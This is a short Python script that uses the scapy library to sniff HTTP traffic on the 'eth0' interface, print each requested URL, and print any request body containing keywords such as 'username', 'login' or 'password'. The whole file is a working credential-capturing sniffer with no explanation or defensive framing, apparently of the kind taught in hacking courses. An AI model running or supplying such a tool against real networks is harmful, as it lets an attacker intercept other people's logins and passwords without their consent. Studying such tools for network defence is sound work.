import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def extract_credentials(load):
    keywords = ["username", "user", "login", "email", "password", "pass", "pwd"]
    load_str = load.decode(errors="ignore")
    for keyword in keywords:
        if keyword in load_str.lower():
            return load_str 
    return None

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("\n[+] HTTP Request: " + url)

        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load
            credentials = extract_credentials(payload)
            if credentials:
                print("[+] Data:", credentials) 

sniff("eth0")
